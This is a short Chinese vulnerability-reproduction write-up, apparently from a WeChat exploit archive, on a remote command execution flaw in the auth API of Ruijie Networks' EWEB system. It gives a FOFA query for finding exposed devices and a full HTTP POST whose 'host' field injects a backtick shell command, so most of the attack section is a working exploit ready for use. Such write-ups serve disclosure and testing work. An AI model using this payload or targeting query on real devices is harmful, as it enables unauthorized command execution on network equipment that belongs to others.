## 1. 锐捷网络-EWEB系统简介

微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发

锐捷网络-EWEB系统

## 2.漏洞描述

锐捷网络-EWEB系统auth接口存在远程命令执行漏洞

CVE编号:

CNNVD编号:

CNVD编号:

## 3.影响版本

锐捷网络-EWEB系统

![锐捷网络-EWEB系统auth接口存在远程命令执行漏洞](%E9%94%90%E6%8D%B7%E7%BD%91%E7%BB%9C-EWEB%E7%B3%BB%E7%BB%9Fauth%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.assets/640.png)锐捷网络-EWEB系统auth接口存在远程命令执行漏洞

## 4.fofa查询语句

body="cgi-bin/luci" && body="#f47f3e"

## 5.漏洞复现

```
POST /cgi-bin/luci/api/auth HTTP/1.1
Host: XXXXXXXXXX.com
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

{"method":"checkNet","params":{"host":"`echo c149136B>666666.txt`"}}
```



漏洞数据包：

![null](%E9%94%90%E6%8D%B7%E7%BD%91%E7%BB%9C-EWEB%E7%B3%BB%E7%BB%9Fauth%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.assets/640-1739327617317-1.png)

![null](%E9%94%90%E6%8D%B7%E7%BD%91%E7%BB%9C-EWEB%E7%B3%BB%E7%BB%9Fauth%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.assets/640-1739327617317-2.jpeg)